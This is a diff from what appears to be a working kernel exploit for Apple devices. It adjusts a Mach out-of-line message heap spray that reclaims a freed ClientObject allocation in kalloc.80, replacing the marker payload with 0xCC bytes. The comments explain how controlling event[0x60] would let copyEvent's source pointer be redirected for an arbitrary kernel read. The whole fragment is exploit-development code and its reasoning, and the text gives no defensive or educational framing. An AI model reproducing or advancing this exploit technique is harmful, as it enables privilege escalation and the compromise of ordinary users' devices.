@@ -3549,11 +3549,10 @@ static const char kOpenPropertiesGarbage[] =
     if (sprayReady) {
         sprayPayload = (uint8_t *)malloc(kOolDataSize);
         if (sprayPayload) {
-            memset(sprayPayload, 0x41, kOolDataSize);
-            *(uint64_t *)(sprayPayload + 0)  = 0xFEEDC0DEDEADBEEFULL;
-            *(uint64_t *)(sprayPayload + 8)  = 0xCAFEBABEDEADBEEFULL;
-            *(uint64_t *)(sprayPayload + 16) = 0xBADC0FFEE0DDF00DULL;
-            *(uint64_t *)(sprayPayload + 32) = 0xDEADBEEFDEADBEEFULL;
+            // Fill entire 72 bytes with 0xCC — if spray reclaims ClientObject's
+            // kalloc.80 slot, copyEvent will read 0xCC from the overwritten fields.
+            // If event[0x60] changes from 0xd3→0xCC, spray controls that field.
+            memset(sprayPayload, 0xCC, kOolDataSize);
 
             // Pre-fill: kSprayQueueDepth messages (fits default Mach port queue limit).
             // Each send copies the 72-byte OOLMsg to kalloc.80 in the port queue.
@@ -3575,7 +3574,7 @@ static const char kOpenPropertiesGarbage[] =
                     sent++;
                 }
             }
-            [self appendLog:[NSString stringWithFormat:@"  Mach OOL spray: %d/%d msgs pre-filled (OOLMsg=%zuB → kalloc.80)", sent, kSprayQueueDepth, sizeof(OOLMsg)]];
+            [self appendLog:[NSString stringWithFormat:@"  Mach OOL spray: %d/%d msgs pre-filled (OOLMsg=%zuB→kalloc.80, payload=0xCC*%d)", sent, kSprayQueueDepth, sizeof(OOLMsg), kOolDataSize]];
             if (sent == 0) sprayReady = 0;
         } else {
             sprayReady = 0;
@@ -4094,19 +4093,16 @@ static const char kOpenPropertiesGarbage[] =
         [self appendLog:[NSString stringWithFormat:@"  Found %d kernel addresses", kleakFound]];
     }
 
-    // ---- Spray verification (behavioral, not buffer scan) ----
-    // The old approach scanned user-mapped buffers for spray markers — but spray
-    // data lives in kernel heap (kalloc.80), not user buffers. That scan was
-    // fundamentally wrong and could never succeed.
+    // ---- Spray verification: 0xCC marker test ----
+    // Spray payload is now all 0xCC (72 bytes). If our PHYSICAL_COPY spray
+    // reclaims the freed ClientObject's kalloc.80 slot, then copyEvent reads
+    // the overwritten fields and the leaked event data SHOULD contain 0xCC
+    // bytes where ClientObject fields map into the event.
     //
-    // Verification now relies on behavioral side effects:
-    //   1. Open error rate: with transient spray removed, open should succeed
-    //      (was 100% failure because garbage XML corrupted connection state)
-    //   2. If spray hit the freed ClientObject slot AND copyEvent dereferenced
-    //      our controlled data, we'd see a kernel panic (our marker 0xFEEDC0DE...
-    //      is an invalid vtable pointer → safeMetaCast crash)
-    //   3. If device survives: either spray didn't hit OR copyEvent didn't
-    //      dereference during the window (timing/zone issue)
+    // Test: if event[0x60] changes from 0xd3→0xCC, spray controls that field
+    // and we can redirect copyEvent's source pointer → arbitrary kernel read.
+    // If 0xd3 persists, spray isn't reaching the field (slot race lost, or
+    // ClientObject >72B with key fields beyond our payload).
     {
         if (sprayReady) {
             [self appendLog:[NSString stringWithFormat:
